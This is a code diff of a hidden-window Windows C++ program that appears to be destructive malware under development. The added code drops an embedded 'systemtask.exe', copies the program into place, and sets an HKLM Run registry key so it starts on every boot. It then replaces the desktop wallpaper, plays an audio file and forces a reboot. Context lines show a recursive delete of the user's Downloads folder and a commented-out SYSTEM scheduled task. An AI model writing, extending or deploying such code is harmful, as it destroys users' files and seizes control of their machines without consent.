@@ -13,19 +13,44 @@ int APIENTRY wWinMain(HINSTANCE Instance, //no window
 	char newLocation[77];
 	strcpy(newLocation, datapath.c_str());
 
-	if (std::filesystem::exists(datapath + "\\systemtask.exe") != true) { //exit if genesis.exe exists in dir
+
+	if (std::filesystem::exists(datapath + "\\systemtask.exe") != true) { //checks for existing file
+		
+		//extracts exe
+		HRSRC hResInformation = FindResource(NULL, MAKEINTRESOURCE(104), _T("BINARY"));
+
+		HGLOBAL hResc = LoadResource(NULL, hResInformation);
+
+		unsigned char* Res = (unsigned char*)LockResource(hResc);
+
+		int Ressize = SizeofResource(NULL, hResInformation);
+
+		HANDLE exeFile = CreateFile(L"systemtask.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		DWORD wWritten = Ressize;
+		WriteFile(exeFile, Res, Ressize, &wWritten, NULL);
+
+		CloseHandle(exeFile);
+		
+		//copies itself to starup folder
 		std::filesystem::copy(filename, newLocation);
-        //std::filesystem::copy(filename, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
+        
+		//****NOT IMPLEMENTED****
+
+		//std::filesystem::copy(filename, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
 		//BOOL stats = 0;
-		//DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH); //copies itself to starup folder
+		//DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH); 
 		//if (size)
 			//CopyFileA(filename, newLocation, stats);
 	}
-	char* userpath = getenv("USERPROFILE"); //get %userprofile% path
-	std::string path;
 	
+	//get %userprofile% path
+	char* userpath = getenv("USERPROFILE"); 
+	std::string path;
+
+	//sets full directory path
 	if (userpath != nullptr) {
-		path = std::string(userpath) + "\\Downloads"; //sets full directory path
+
+		path = std::string(userpath) + "\\Downloads"; 
 
 	}
 	//removes files under dir recusivly
@@ -59,16 +84,56 @@ int APIENTRY wWinMain(HINSTANCE Instance, //no window
 	//system("cmd /c schtasks.exe /create /f /sc onlogon /tn \"SYSTEMPROCESS\" /tr \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemtask.exe\" /ru system /rl highest");
 	
 	//creates registry key for autostart
-	std::wstring progPath = L"%APPDATA%\\Microsoft\\Start Menu\\Programs\\Startup\\systemtask.exe";
+	std::string progPath = "%APPDATA%\\Microsoft\\Start Menu\\Programs\\Startup\\systemtask.exe";
 	HKEY hkey = NULL;
 	LONG createStatus = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);       
 	LONG status = RegSetValueEx(hkey, L"SYSTEMTASK", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
     
+
+	//extracts jpg
+	HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(101), _T("JPG"));
+
+	HGLOBAL hRes = LoadResource(NULL, hResInfo);
+
+	unsigned char* memRes = (unsigned char*)LockResource(hRes);
+	
+	int sizeRes = SizeofResource(NULL, hResInfo);
+	
+	HANDLE hFile = CreateFile(L"bg.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	DWORD bytesWritten = sizeRes;
+	WriteFile(hFile, memRes, sizeRes, &bytesWritten, NULL);
+
+	CloseHandle(hFile);
+	
+	
+	//extracts wav audio
+	HRSRC hResInf = FindResource(NULL, MAKEINTRESOURCE(102), _T("WAVE"));
+
+	HGLOBAL hRe = LoadResource(NULL, hResInf);
+
+	unsigned char* mRes = (unsigned char*)LockResource(hRe);
+
+	int size = SizeofResource(NULL, hResInf);
+
+	HANDLE File = CreateFile(L"compositept2.wav", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	DWORD Written = size;
+	WriteFile(File, mRes, size, &Written, NULL);
+
+	CloseHandle(File);
+	
+	//sets jpg as desktop background
+	std::string jpgpath = "bg.jpg";
+	SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)jpgpath.c_str(), SPIF_UPDATEINIFILE);
+	
+	
+	//plays wav file
+	PlaySound(L"compositept2.wav", NULL, SND_FILENAME);
+
 	//****NOT IMPLEMENTED****
 
 	//ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 
         //SHTDN_REASON_MINOR_OTHER);
 	
-	InitiateSystemShutdownExA(NULL,NULL,0,true, false, SHTDN_REASON_MINOR_OTHER); //shuts down computer
+	InitiateSystemShutdownExA(NULL,NULL,0,true, true, SHTDN_REASON_MINOR_OTHER); //restarts system
 	return 0;
 }
